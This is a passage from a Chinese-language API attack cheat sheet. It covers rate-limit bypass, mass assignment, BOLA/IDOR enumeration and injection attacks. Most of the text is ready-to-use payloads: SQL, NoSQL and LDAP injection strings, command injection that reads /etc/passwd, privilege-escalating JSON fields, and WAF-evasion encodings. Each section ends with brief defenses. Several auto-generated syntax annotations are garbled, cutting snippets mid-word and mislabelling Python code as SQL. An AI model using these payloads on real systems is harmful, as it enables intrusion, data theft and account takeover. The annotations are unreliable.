proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# 使用Tor
# 每次请求头换Tor电路
import stem.process
import requests

# 使用云函数
# AWS Lambda, Azure Functions等
```
**语法解析：**
- `Bearer` — 令牌类型 _keyword_
- `Authorization` — 认证头 _header_

**4. 其他绕过技术**
> 其他绕过技术
```
# 用户代理绕过
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# 认证绕过
# 使用不同账户
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2多路复用
# 单个连接发送多个请求

# 缓慢请求
# Slowloris攻击
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `-H` — 自定义请求头 _parameter_
- `Authorization` — 认证头 _header_

**WAF/EDR 绕过变体：**

**API Key轮换**
> API Key轮换
```
# 使用多个API Key
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# 注册多个账户获取多个Token
```
**语法解析：**
- `# 使用多个API Key
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumer` — 攻击载荷 _value_

**请求分散**
> 请求分散
```
# 添加延迟
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 每次请求头隔0.5秒

# 分散到不同时间段
# 使用定时任务分散请求
```
**语法解析：**
- `# 添加延迟
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.` — SQL表达式 _value_
- `sleep` — SQL关键字 _keyword_
- `(0.5)  # 每次请求头隔0.5秒

# 分散到不同时间段
# 使用定时任务分散请求` — SQL表达式 _value_


**概述：** API速率限制缺失允许攻击者无限制地调用API接口，可导致暴力破解(密码/OTP)、数据批量爬取、资源滥用(发送大量短信/邮件)和拒绝服务等严重安全问题。

**漏洞原理：** API速率限制绕过：1)完全无速率限制(可无限调用) 2)仅基于IP限制(更换IP/使用代理绕过) 3)仅基于用户限制(创建多个账号) 4)仅限制某些端点(找到不受限的等价端点) 5)HTTP方法变换绕过(GET→POST) 6)增加请求参数绕过签名。

**利用方法：** 完整利用流程：
1. 检测速率限制阈值
2. 分析限制基于什么(IP/用户/Key)
3. 选择合适的绕过方法
4. 执行暴力攻击

**防御措施：** 防御措施：
1. 基于用户+IP组合限流
2. 不信任客户端IP头
3. 使用滑动窗口限流
4. 实施CAPTCHA
5. 监控异常访问模式

---

### 批量赋值漏洞  `api-mass-assignment`
_利用批量赋值漏洞修改敏感字段_
子类：**批量赋值** · tags: `api` `mass-assignment` `privilege-escalation`

**前置条件：**
- API接受JSON输入
- 存在未过滤的字段

**攻击链：**

**1. 识别输入字段**
> 识别返回的字段
```
# 正常请求
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# 观察响应
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```
**语法解析：**
- `role` — 用户角色字段 _value_
- `isAdmin` — 管理员标志 _value_

**2. 添加敏感字段**
> 添加敏感字段
```
# 尝试添加role字段
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# 尝试isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# 尝试多个字段
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```
**语法解析：**
- `"role": "admin"` — 尝试设置管理员角色 _value_
- `"isAdmin": true` — 尝试设置管理员标志 _value_

**3. 更新操作**
> 更新操作测试
```
# PUT/PATCH更新
PATCH /api/users/123
{
  "role": "admin"
}

# 尝试修改其他用户
PATCH /api/users/1
{
  "role": "admin"
}

# 尝试修改密码
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

**4. 嵌套对象**
> 嵌套对象测试
```
# 嵌套对象赋值
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# 数组赋值
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

**WAF/EDR 绕过变体：**

**字段变体**
> 尝试字段变体
```
# 尝试不同字段名
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# 尝试内部字段
__v, _id, created_at, updated_at
password_hash, passwordHash
```
**语法解析：**
- `# 尝试不同字段名
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userTyp` — 攻击载荷 _value_

**类型混淆**
> 类型混淆测试
```
# 数字转布尔
{"isAdmin": 1}
{"isAdmin": "true"}

# 数组转字符串
{"roles": "admin"}

# 对象转数组
{"settings": ["admin"]}
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 数字转布尔
{"isAdmin": 1}
{"isAdmin": "true"}

# 数组转字符串
{"roles": "admin"}

# 对象转数组
{"settings": ["admin"]}` — 参数与载荷内容 _value_


**概述：** 批量赋值(Mass Assignment)漏洞发生在API自动将请求参数绑定到数据模型时，攻击者通过提交额外的字段(如role=admin/is_verified=true)来修改不应由用户控制的属性。

**漏洞原理：** 批量赋值漏洞场景：1)用户注册时添加role:admin字段提升权限 2)修改个人资料时添加balance:999999修改余额 3)创建订单时修改price:0改价格 4)更新设置时添加is_admin:true获取管理权限。框架的自动绑定特性(如Spring/Rails)是根因。

**利用方法：** 完整利用流程：
1. 发送正常请求观察响应字段
2. 识别敏感字段(role, isAdmin等)
3. 在请求中添加敏感字段
4. 验证是否成功修改

**防御措施：** 防御措施：
1. 使用DTO(数据传输对象)
2. 白名单允许的字段
3. 使用对象映射库配置
4. 验证和过滤输入

---

### BOLA破坏对象级授权  `api-bola`
_利用BOLA漏洞访问未授权对象_
子类：**BOLA** · tags: `api` `bola` `authorization` `idor`

**前置条件：**
- API使用对象ID
- 授权检查缺陷

**攻击链：**

**1. 识别对象访问**
> 识别对象访问模式
```
# 观察API端点
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# 分析对象关系
# 用户 -> 文档
# 团队 -> 成员
# 订单 -> 用户
```
**语法解析：**
- `{user_id}` — 用户ID参数 _value_
- `{team_id}` — 团队ID参数 _value_

**2. 测试授权**
> 测试授权检查
```
# 创建两个账户测试
# 用户A: user_a_token
# 用户B: user_b_token

# 用户A创建资源
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# 返回: {"id": "doc_123"}

# 用户B尝试访问
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# 如果返回200，存在BOLA
```
**语法解析：**
- `POST` — HTTP方法 _method_
- `Authorization` — 认证头 _header_

**3. 横向访问**
> 横向访问测试
```
# 枚举其他用户资源
for doc_id in doc_1 doc_2 doc_3; do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# 访问其他用户私有数据
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `-H` — 自定义请求头 _parameter_
- `Authorization` — 认证头 _header_

**4. 修改/删除操作**
> 修改/删除操作测试
```
# 修改其他用户数据
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# 删除其他用户数据
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# 添加到其他团队
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```
**语法解析：**
- `Authorization` — 认证头 _header_

**WAF/EDR 绕过变体：**

**路径遍历**
> 路径遍历绕过
```
# 路径遍历访问
GET /api/users/../admin
GET /api/users/..%2Fadmin

# 编码绕过
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 路径遍历访问
GET /api/users/../admin
GET /api/users/..%2Fadmin

# 编码绕过
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin` — 参数与载荷内容 _value_

**参数篡改**
> 参数篡改绕过
```
# 修改请求方法
# GET变POST
POST /api/documents/doc_123

# 添加参数
GET /api/documents/doc_123?user_id=attacker

# 修改Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 修改请求方法
# GET变POST
POST /api/documents/doc_123

# 添加参数
GET /api/documents/doc_123?user_id=attacker

# 修改Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>` — 参数与载荷内容 _value_


**概述：** BOLA(Broken Object Level Authorization)是OWASP API Top 10排名第一的漏洞，指API在对象级别缺乏适当的授权检查，允许认证用户访问或操作不属于自己的资源对象。

**漏洞原理：** BOLA与IDOR密切相关，但更强调授权层面的缺陷：1)API仅验证用户已登录但不验证对象所有权 2)通过ID遍历可批量获取所有用户数据 3)GraphQL中通过节点ID直接访问任意对象 4)关联对象授权缺失(访问他人的子资源)。

**利用方法：** 完整利用流程：
1. 识别使用对象ID的API
2. 创建多个测试账户
3. 测试跨账户访问
4. 枚举其他对象
5. 尝试修改/删除操作

**防御措施：** 防御措施：
1. 实施对象级授权检查
2. 验证用户对资源的所有权
3. 使用不可预测的ID
4. 记录异常访问
5. 实施速率限制

---

### API注入攻击  `api-injection`
_API端点中的各类注入攻击_
子类：**API注入** · tags: `api` `injection` `sqli` `nosqli`

**前置条件：**
- API接受用户输入
- 输入未正确过滤

**攻击链：**

**1. SQL注入**
> API SQL注入
```
# REST API SQL注入
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; SELECT SLEEP(5)--

# POST请求注入
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON注入
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```
**语法解析：**
- `OR 1=1` — SQL注入永真条件 _value_
- `UNION SELECT` — 联合查询注入 _value_

**2. NoSQL注入**
> NoSQL注入
```
# MongoDB注入
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST请求
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# 嵌套查询
{"$where": "this.password == this.password"}
{"$where": "return true"}
```
**语法解析：**
- `$ne` — MongoDB不等于操作符 _variable_
- `$regex` — 正则表达式匹配 _variable_
- `$where` — JavaScript执行 _variable_

**3. LDAP注入**
> LDAP注入
```
# LDAP注入
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# 认证绕过
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# 信息泄露
GET /api/search?name=*)(objectClass=*)
```
**语法解析：**
- `*)` — LDAP闭合当前过滤器 _value_
- `(uid=*)` — 匹配所有用户 _value_

**4. 命令注入**
> 命令注入
```
# OS命令注入
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST请求
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# 反引号注入
GET /api/check?host=`id`
GET /api/check?host=$(id)
```
**语法解析：**
- `;id` — 命令分隔符后执行id命令 _value_
- ``id`` — 命令替换执行 _value_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
# URL编码
GET /api/users?id=1%20OR%201%3D1

# Unicode编码
GET /api/users?id=1%u0020OR%u00201%3D1

# 双重编码
GET /api/users?id=1%2520OR%25201%253D1
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` URL编码
GET /api/users?id=1%20OR%201%3D1

# Unicode编码
GET /api/users?id=1%u0020OR%u00201%3D1

# 双重编码
GET /api/users?id=1%2520OR%25201%253D1` — 参数与载荷内容 _value_

**Content-Type绕过**
> Content-Type绕过
```
# 切换Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON数组
{"id": ["1", "OR", "1=1"]}
```
**语法解析：**
- `# 切换Content-Type
Content-Type: application/xml
<user><id>1 ` — SQL表达式 _value_
- `OR` — SQL关键字 _keyword_
- ` 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+` — SQL表达式 _value_
- `OR` — SQL关键字 _keyword_
- `+1=1

# JSON数组
{"id": ["1", "` — SQL表达式 _value_
- `OR` — SQL关键字 _keyword_
- `", "1=1"]}` — SQL表达式 _value_


**概述：** API注入攻击将传统的注入技术(SQL/NoSQL/OS命令/LDAP等)应用于API接口，JSON/XML格式的输入参数、查询字符串、HTTP头等都可能成为注入点，且API通常缺少Web应用的WAF防护。

**漏洞原理：** API注入攻击面：1)JSON参数中的SQL/NoSQL注入 2)GraphQL查询变量中的注入 3)API网关/中间件的头注入(Host/X-Forwarded-For) 4)文件名/路径参数的命令注入 5)LDAP/XPATH查询参数注入 6)API响应中的XSS(存储型)。

**利用方法：** 完整利用流程：
1. 识别输入点
2. 分析后端技术栈
3. 选择合适的注入类型
4. 构造注入payload
5. 提取数据或执行命令

**防御措施：** 防御措施：
1. 使用参数化查询
2. 输入验证和白名单
3. 最小权限原则
4. 错误信息不泄露
5. WAF防护

---
